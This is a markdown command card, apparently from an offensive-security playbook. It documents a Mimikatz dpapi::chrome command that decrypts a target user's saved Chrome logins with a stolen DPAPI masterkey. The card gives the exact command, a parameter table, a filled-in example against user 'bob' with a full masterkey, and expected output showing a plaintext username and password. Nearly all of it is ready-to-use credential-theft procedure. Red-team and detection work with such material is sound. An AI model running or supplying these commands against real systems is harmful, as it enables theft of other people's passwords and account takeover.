---
type: command
executor: command_prompt
data: >-
  mimikatz.exe dpapi::chrome
  /in:"C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User
  Data\Default\Login Data" /unprotect /masterkey:$_MASTER_KEY
tags:
  - credential-access
  - dpapi
  - chrome
platforms:
  - Windows
verified: true
validated: true
---

# mimikatz-extract-chrome-credentials-with-masterkey

## Command

```command_prompt
mimikatz.exe dpapi::chrome /in:"C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect /masterkey:$_MASTER_KEY
```

## Description

Decrypts Chrome credentials using a provided masterkey after DPAPI protection has been bypassed. Targets the Login Data SQLite file to extract saved web logins.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /in | Path to Chrome Login Data file | Yes |
| $_TARGET_USER | Target username | Yes |
| /unprotect | Enables unprotection with masterkey | Yes |
| /masterkey | Decrypted masterkey hex value | Yes |
| $_MASTER_KEY | pbKey from masterkey decryption (e.g., daef77bbf4c8fae8...) | Yes |

## Examples

### Basic Usage

From Mimikatz prompt: dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect /masterkey:daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723

## Expected Output

> AES Key is: 700c4a9477bf45ac86e53c109511907330a66bad896f3429da96cb70b9afd9f4

URL     : http://10.10.1.1/ ( http://10.10.1.1/ )
Username: admin
Password: SuP3rUnCr4cK4B73

Plaintext credentials listed.

## Related

- [[procedures/Extract-Chrome-Cookies-and-Credentials-from-User-Profile-with-Domain-Admin]]
- [[tools/Mimikatz]]
